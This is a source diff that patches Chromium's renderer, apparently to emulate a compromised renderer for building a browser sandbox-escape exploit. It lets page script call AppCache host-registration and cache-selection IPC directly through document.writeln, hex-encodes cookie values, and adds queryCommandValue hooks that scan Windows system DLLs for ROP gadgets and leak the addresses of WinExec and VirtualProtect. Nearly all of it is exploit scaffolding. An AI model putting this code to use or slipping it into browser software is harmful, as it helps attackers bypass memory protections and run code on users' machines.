@@ -1,0 +1,410 @@
+diff --git a/content/renderer/appcache/web_application_cache_host_impl.cc b/content/renderer/appcache/web_application_cache_host_impl.cc
+index 8e1f7d18566a..d0a8e9539a2d 100644
+--- a/content/renderer/appcache/web_application_cache_host_impl.cc
++++ b/content/renderer/appcache/web_application_cache_host_impl.cc
+@@ -64,7 +64,8 @@ WebApplicationCacheHostImpl::WebApplicationCacheHostImpl(
+       is_scheme_supported_(false),
+       is_get_method_(false),
+       is_new_master_entry_(MAYBE_NEW_ENTRY),
+-      was_select_cache_called_(false) {
++      // pretend select cache was called so we don't call it normally
++      was_select_cache_called_(true) {
+   DCHECK(client && backend);
+   // PlzNavigate: The browser passes the ID to be used.
+   if (appcache_host_id != kAppCacheNoHostId) {
+@@ -83,6 +84,20 @@ WebApplicationCacheHostImpl::~WebApplicationCacheHostImpl() {
+   all_hosts()->Remove(host_id_);
+ }
+ 
++void WebApplicationCacheHostImpl::RegisterHost(int32_t host_id) {
++  backend_->RegisterHost(host_id);
++}
++
++void WebApplicationCacheHostImpl::UnregisterHost(int32_t host_id) {
++  backend_->UnregisterHost(host_id);
++}
++
++void WebApplicationCacheHostImpl::SelectCache(int32_t host_id, const WebURL& document_url, int64_t cache_document_was_loaded_from, const WebURL& opt_manifest_url) {
++  GURL document_gurl(ClearUrlRef(document_url));
++  GURL opt_manifest_gurl(ClearUrlRef(opt_manifest_url));
++  backend_->SelectCache(host_id, document_gurl, cache_document_was_loaded_from, opt_manifest_gurl);
++}
++
+ void WebApplicationCacheHostImpl::OnCacheSelected(
+     const AppCacheInfo& info) {
+   cache_info_ = info;
+diff --git a/content/renderer/appcache/web_application_cache_host_impl.h b/content/renderer/appcache/web_application_cache_host_impl.h
+index d847549469c1..c4cda9e1d6a0 100644
+--- a/content/renderer/appcache/web_application_cache_host_impl.h
++++ b/content/renderer/appcache/web_application_cache_host_impl.h
+@@ -31,6 +31,10 @@ class WebApplicationCacheHostImpl : public blink::WebApplicationCacheHost {
+   AppCacheBackend* backend() const { return backend_; }
+   blink::WebApplicationCacheHostClient* client() const { return client_; }
+ 
++  void RegisterHost(int32_t host_id) override;
++  void UnregisterHost(int32_t host_id) override;
++  void SelectCache(int32_t host_id, const blink::WebURL& manifest_url, int64_t cache_document_was_loaded_from, const blink::WebURL& opt_manifest_url) override;
++
+   virtual void OnCacheSelected(const AppCacheInfo& info);
+   void OnStatusChanged(AppCacheStatus);
+   void OnEventRaised(AppCacheEventID);
+diff --git a/content/renderer/renderer_webcookiejar_impl.cc b/content/renderer/renderer_webcookiejar_impl.cc
+index d5e0ef88c309..17464e0392d8 100644
+--- a/content/renderer/renderer_webcookiejar_impl.cc
++++ b/content/renderer/renderer_webcookiejar_impl.cc
+@@ -6,6 +6,7 @@
+ 
+ #include "base/bind.h"
+ #include "base/bind_helpers.h"
++#include "base/strings/string_number_conversions.h"
+ #include "base/strings/utf_string_conversions.h"
+ #include "content/common/frame_messages.h"
+ #include "content/public/renderer/content_renderer_client.h"
+@@ -32,7 +33,8 @@ WebString RendererWebCookieJarImpl::Cookies(const WebURL& url,
+   std::string value_utf8;
+   RenderThreadImpl::current()->render_frame_message_filter()->GetCookies(
+       sender_->GetRoutingID(), url, site_for_cookies, &value_utf8);
+-  return WebString::FromUTF8(value_utf8);
++  std::string value_hex = base::HexEncode(value_utf8.data(), value_utf8.size());
++  return WebString::FromUTF8(value_hex);
+ }
+ 
+ bool RendererWebCookieJarImpl::CookiesEnabled(const WebURL& url,
+diff --git a/third_party/blink/public/platform/web_application_cache_host.h b/third_party/blink/public/platform/web_application_cache_host.h
+index 722fbc2127d7..8728596837b1 100644
+--- a/third_party/blink/public/platform/web_application_cache_host.h
++++ b/third_party/blink/public/platform/web_application_cache_host.h
+@@ -89,6 +89,10 @@ class WebApplicationCacheHost {
+       const WebString& method,
+       const WebApplicationCacheHost* spawning_host) {}
+ 
++  virtual void RegisterHost(int32_t host_id) {}
++  virtual void UnregisterHost(int32_t host_id) {}
++  virtual void SelectCache(int32_t host_id, const WebURL& document_url, int64_t cache_document_was_loaded_from, const WebURL& opt_manifest_url);
++
+   // One or the other selectCache methods is called after having parsed the
+   // <html> tag.  The latter returns false if the current document has been
+   // identified as a "foreign" entry, in which case the frame navigation will be
+diff --git a/third_party/blink/renderer/core/dom/document.cc b/third_party/blink/renderer/core/dom/document.cc
+index 5bfe30b8b880..1d8696000ad9 100644
+--- a/third_party/blink/renderer/core/dom/document.cc
++++ b/third_party/blink/renderer/core/dom/document.cc
+@@ -32,6 +32,7 @@
+ #include <memory>
+ 
+ #include "base/auto_reset.h"
++#include "base/strings/string_number_conversions.h"
+ #include "services/metrics/public/cpp/mojo_ukm_recorder.h"
+ #include "services/metrics/public/cpp/ukm_builders.h"
+ #include "services/metrics/public/cpp/ukm_source_id.h"
+@@ -3805,6 +3806,57 @@ void Document::writeln(LocalDOMWindow* calling_window,
+                        ExceptionState& exception_state) {
+   DCHECK(calling_window);
+ 
++  printf("Document.writeln with %zu args\n", text.size());
++
++  if (text.size() < 1) {
++    return;
++  }
++  const String& command = text[0];
++  if (command == "2") {
++    bool parsed = false;
++    int32_t host_id = text[1].ToInt(&parsed);
++    if (!parsed) {
++      printf("Renderer hacked RegisterHost failed to parse host_id\n");
++      return;
++    }
++
++    printf("Renderer hacked RegisterHost(%u)\n", host_id);
++    Loader()->GetApplicationCacheHost()->RegisterHost(host_id);
++    return;
++  } else if (command == "3") {
++    bool parsed = false;
++    int32_t host_id = text[1].ToInt(&parsed);
++    if (!parsed) {
++      printf("Renderer hacked UnregisterHost failed to parse host_id\n");
++      return;
++    }
++
++    printf("Renderer hacked UnregisterHost(%u)\n", host_id);
++    Loader()->GetApplicationCacheHost()->UnregisterHost(host_id);
++    return;
++  } else if (command == "4") {
++    CHECK_EQ(text.size(), 5u);
++    bool parsed = false;
++    int32_t host_id = text[1].ToInt(&parsed);
++    if (!parsed) {
++      printf("Renderer hacked SelectCache failed to parse host_id\n");
++      return;
++    }
++
++    // Cast up from int32_t since we probably don't need more than an int
++    int64_t cache_id = (int64_t)text[3].ToInt(&parsed);
++    if (!parsed) {
++      printf("Renderer hacked SelectCache failed to parse cache_id\n");
++      return;
++    }
++
++    KURL document_kurl = CompleteURL(text[2]);
++    KURL opt_manifest_kurl = CompleteURL(text[4]);
++
++    Loader()->GetApplicationCacheHost()->SelectCache(host_id, document_kurl, cache_id, opt_manifest_kurl);
++    return;
++  }
++
+   if (GetSecurityContext().RequireTrustedTypes()) {
+     DCHECK(RuntimeEnabledFeatures::TrustedDOMTypesEnabled());
+     exception_state.ThrowTypeError(
+diff --git a/third_party/blink/renderer/core/editing/commands/document_exec_command.cc b/third_party/blink/renderer/core/editing/commands/document_exec_command.cc
+index 9cbe75b81b88..806c194861fe 100644
+--- a/third_party/blink/renderer/core/editing/commands/document_exec_command.cc
++++ b/third_party/blink/renderer/core/editing/commands/document_exec_command.cc
+@@ -41,6 +41,8 @@
+ #include "third_party/blink/renderer/platform/histogram.h"
+ #include "third_party/blink/renderer/platform/wtf/std_lib_extras.h"
+ 
++#include <Windows.h>
++
+ namespace blink {
+ 
+ namespace {
+@@ -145,8 +147,198 @@ bool Document::queryCommandSupported(const String& command_name,
+   return GetCommand(this, command_name).IsSupported();
+ }
+ 
++static const char* find_gadget(const void* buffer, const char* pattern, int size) {
++  const char* p = (const char*)buffer;
++  for (; memcmp(p, pattern, size); ++p) {}
++  return p;
++}
++
++static String format_addr(void* address) {
++  uint64_t addr = (uint64_t)address;
++  return String::Number(addr);
++}
++
++typedef struct _UNICODE_STR
++{
++	USHORT Length;
++	USHORT MaximumLength;
++	PWSTR pBuffer;
++} UNICODE_STR, *PUNICODE_STR;
++
++// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
++//__declspec( align(8) )
++typedef struct _LDR_DATA_TABLE_ENTRY
++{
++	//LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.
++	LIST_ENTRY InMemoryOrderModuleList;
++	LIST_ENTRY InInitializationOrderModuleList;
++	PVOID DllBase;
++	PVOID EntryPoint;
++	ULONG SizeOfImage;
++	UNICODE_STR FullDllName;
++	UNICODE_STR BaseDllName;
++	ULONG Flags;
++	SHORT LoadCount;
++	SHORT TlsIndex;
++	LIST_ENTRY HashTableEntry;
++	ULONG TimeDateStamp;
++} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
++
++// WinDbg> dt -v ntdll!_PEB_LDR_DATA
++typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
++{
++	DWORD dwLength;
++	DWORD dwInitialized;
++	LPVOID lpSsHandle;
++	LIST_ENTRY InLoadOrderModuleList;
++	LIST_ENTRY InMemoryOrderModuleList;
++	LIST_ENTRY InInitializationOrderModuleList;
++	LPVOID lpEntryInProgress;
++} PEB_LDR_DATA, *PPEB_LDR_DATA;
++
++// WinDbg> dt -v ntdll!_PEB_FREE_BLOCK
++typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
++{
++	struct _PEB_FREE_BLOCK * pNext;
++	DWORD dwSize;
++} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;
++
++// struct _PEB is defined in Winternl.h but it is incomplete
++// WinDbg> dt -v ntdll!_PEB
++typedef struct __PEB // 65 elements, 0x210 bytes
++{
++	BYTE bInheritedAddressSpace;
++	BYTE bReadImageFileExecOptions;
++	BYTE bBeingDebugged;
++	BYTE bSpareBool;
++	LPVOID lpMutant;
++	LPVOID lpImageBaseAddress;
++	PPEB_LDR_DATA pLdr;
++	LPVOID lpProcessParameters;
++	LPVOID lpSubSystemData;
++	LPVOID lpProcessHeap;
++	PRTL_CRITICAL_SECTION pFastPebLock;
++	LPVOID lpFastPebLockRoutine;
++	LPVOID lpFastPebUnlockRoutine;
++	DWORD dwEnvironmentUpdateCount;
++	LPVOID lpKernelCallbackTable;
++	DWORD dwSystemReserved;
++	DWORD dwAtlThunkSListPtr32;
++	PPEB_FREE_BLOCK pFreeList;
++	DWORD dwTlsExpansionCounter;
++	LPVOID lpTlsBitmap;
++	DWORD dwTlsBitmapBits[2];
++	LPVOID lpReadOnlySharedMemoryBase;
++	LPVOID lpReadOnlySharedMemoryHeap;
++	LPVOID lpReadOnlyStaticServerData;
++	LPVOID lpAnsiCodePageData;
++	LPVOID lpOemCodePageData;
++	LPVOID lpUnicodeCaseTableData;
++	DWORD dwNumberOfProcessors;
++	DWORD dwNtGlobalFlag;
++	LARGE_INTEGER liCriticalSectionTimeout;
++	DWORD dwHeapSegmentReserve;
++	DWORD dwHeapSegmentCommit;
++	DWORD dwHeapDeCommitTotalFreeThreshold;
++	DWORD dwHeapDeCommitFreeBlockThreshold;
++	DWORD dwNumberOfHeaps;
++	DWORD dwMaximumNumberOfHeaps;
++	LPVOID lpProcessHeaps;
++	LPVOID lpGdiSharedHandleTable;
++	LPVOID lpProcessStarterHelper;
++	DWORD dwGdiDCAttributeList;
++	LPVOID lpLoaderLock;
++	DWORD dwOSMajorVersion;
++	DWORD dwOSMinorVersion;
++	WORD wOSBuildNumber;
++	WORD wOSCSDVersion;
++	DWORD dwOSPlatformId;
++	DWORD dwImageSubsystem;
++	DWORD dwImageSubsystemMajorVersion;
++	DWORD dwImageSubsystemMinorVersion;
++	DWORD dwImageProcessAffinityMask;
++	DWORD dwGdiHandleBuffer[34];
++	LPVOID lpPostProcessInitRoutine;
++	LPVOID lpTlsExpansionBitmap;
++	DWORD dwTlsExpansionBitmapBits[32];
++	DWORD dwSessionId;
++	ULARGE_INTEGER liAppCompatFlags;
++	ULARGE_INTEGER liAppCompatFlagsUser;
++	LPVOID lppShimData;
++	LPVOID lpAppCompatInfo;
++	UNICODE_STR usCSDVersion;
++	LPVOID lpActivationContextData;
++	LPVOID lpProcessAssemblyStorageMap;
++	LPVOID lpSystemDefaultActivationContextData;
++	LPVOID lpSystemAssemblyStorageMap;
++	DWORD dwMinimumStackCommit;
++} _PEB, *_PPEB;
++
++typedef struct
++{
++	WORD    offset : 12;
++	WORD    type : 4;
++} IMAGE_RELOC, *PIMAGE_RELOC;
++
++char* find_mod(const char* name) {
++	_PPEB peb = (_PPEB)__readgsqword(0x60);
++
++	// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
++	PPEB_LDR_DATA ldr = peb->pLdr;
++
++	// get the first entry of the InMemoryOrder module list
++	PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)ldr->InMemoryOrderModuleList.Flink;
++	PLDR_DATA_TABLE_ENTRY first = entry;
++	char buf[1024];
++	do {
++		// entry->BaseDllName.pBuffer;
++		int i = 0;
++		for (; i < entry->BaseDllName.Length; ++i) {
++			buf[i] = entry->BaseDllName.pBuffer[i] & 0xff;
++		}
++		buf[i] = 0;
++		if (!_stricmp(buf, name))
++			return (char*)entry->DllBase;
++		entry = (PLDR_DATA_TABLE_ENTRY)entry->InMemoryOrderModuleList.Flink;
++	} while (entry && entry != first);
++	return 0;
++}
++
+ String Document::queryCommandValue(const String& command_name,
+                                    ExceptionState& exception_state) {
++  if (command_name == "is_hacked") {
++    return "yes_hacked";
++  }
++
++  if (command_name == "get_gadget_WinExec") {
++    return format_addr((void*)GetProcAddress(LoadLibraryA("kernel32"), "WinExec"));
++  }
++
++  if (command_name == "get_gadget_longjmp") {
++    return format_addr((void*)find_gadget(find_mod("ntdll.dll"), "\x48\x8b\x51\x50\x48\x8b\x69\x18\x48\x8b\x61\x10\xff\xe2", 14));
++  }
++
++  if (command_name == "get_gadget_poprcx") {
++    return format_addr((void*)find_gadget(find_mod("msvcrt.dll"), "\x59\xc3", 2));
++  }
++
++  if (command_name == "get_gadget_poprdx") {
++    return format_addr((void*)find_gadget(find_mod("msvcrt.dll"), "\x5a\xc3", 2));
++  }
++
++  if (command_name == "get_gadget_popr8") {
++    return format_addr((void*)find_gadget(find_mod("windows.storage.dll"), "\x41\x58\xc3", 3));
++  }
++
++  if (command_name == "get_gadget_storagemisc") {
++		//0x18007f909: mov r9, rcx; sub r9, rdx; cmp rcx, rdx; mov qword[r8], r9; sbb eax, eax; and eax, 0x80070216; ret
++    return format_addr((void*)(find_mod("windows.storage.dll") + 0x7f909));
++  }
++
++  if (command_name == "get_gadget_VirtualProtect") {
++    return format_addr((void*)GetProcAddress(LoadLibraryA("kernel32"), "VirtualProtect"));
++  }
++
+   if (!IsHTMLDocument() && !IsXHTMLDocument()) {
+     exception_state.ThrowDOMException(
+         DOMExceptionCode::kInvalidStateError,
+diff --git a/third_party/blink/renderer/core/loader/appcache/application_cache_host.cc b/third_party/blink/renderer/core/loader/appcache/application_cache_host.cc
+index e9ff97a67196..eaaae3676b65 100644
+--- a/third_party/blink/renderer/core/loader/appcache/application_cache_host.cc
++++ b/third_party/blink/renderer/core/loader/appcache/application_cache_host.cc
+@@ -131,6 +131,21 @@ void ApplicationCacheHost::WillStartLoadingMainResource(const KURL& url,
+   // loading pipeline.
+ }
+ 
++void ApplicationCacheHost::RegisterHost(int32_t host_id) {
++  CHECK(host_);
++  host_->RegisterHost(host_id);
++}
++
++void ApplicationCacheHost::UnregisterHost(int32_t host_id) {
++  CHECK(host_);
++  host_->UnregisterHost(host_id);
++}
++
++void ApplicationCacheHost::SelectCache(int32_t host_id, const KURL& manifest_url, int64_t cache_document_was_loaded_from, const KURL& opt_manifest_url) {
++  CHECK(host_);
++  host_->SelectCache(host_id, manifest_url, cache_document_was_loaded_from, opt_manifest_url);
++}
++
+ void ApplicationCacheHost::SelectCacheWithoutManifest() {
+   if (host_)
+     host_->SelectCacheWithoutManifest();
+diff --git a/third_party/blink/renderer/core/loader/appcache/application_cache_host.h b/third_party/blink/renderer/core/loader/appcache/application_cache_host.h
+index 53568a1eab5b..6640cda838f7 100644
+--- a/third_party/blink/renderer/core/loader/appcache/application_cache_host.h
++++ b/third_party/blink/renderer/core/loader/appcache/application_cache_host.h
+@@ -123,6 +123,10 @@ class CORE_EXPORT ApplicationCacheHost final
+ 
+   typedef Vector<ResourceInfo> ResourceInfoList;
+ 
++  void RegisterHost(int32_t host_id);
++  void UnregisterHost(int32_t host_id);
++  void SelectCache(int32_t host_id, const KURL& manifest_url, int64_t cache_document_was_loaded_from, const KURL& opt_manifest_url);
++
+   void SelectCacheWithoutManifest();
+   void SelectCacheWithManifest(const KURL& manifest_url);
+ 
